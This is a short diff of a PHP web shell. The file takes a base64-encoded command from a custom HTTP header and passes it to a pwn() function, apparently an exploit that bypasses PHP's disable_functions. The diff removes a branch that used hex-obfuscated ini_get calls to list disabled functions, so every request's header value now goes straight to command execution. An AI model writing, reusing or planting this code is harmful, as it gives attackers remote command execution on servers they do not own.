@@ -1,12 +1,9 @@
 <?php
 
 
-if (base64_decode($_SERVER['HTTP_AIZAWA_NINJA']) === "disable_functions") {
-    echo (!empty(@"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions')) ? @"\x69\x6E\x69\x5F\x67\x65\x74"('disable_functions') : 'NONE');
-    exit;
-} else {
-    pwn(base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));
-}
+
+pwn(base64_decode($_SERVER['HTTP_AIZAWA_NINJA']));
+
 
 function pwn($cmd) {
     define('LOGGING', false);
